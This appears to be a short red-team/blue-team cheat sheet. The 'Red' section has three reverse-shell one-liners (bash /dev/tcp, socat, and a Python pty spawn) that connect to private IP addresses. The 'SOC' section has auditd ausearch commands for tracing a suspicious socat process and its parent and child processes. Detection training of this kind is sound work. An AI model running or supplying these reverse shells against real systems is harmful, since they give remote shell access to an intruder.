# Red
## Reverse shell
```
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```

# SOC
```
ausearch -i -x socat # Look for suspicious commands
ausearch -i --pid 27806 # Find its parent process and build a process tree
ausearch -i --ppid 27808 | grep proctitle # List all its child processes
```
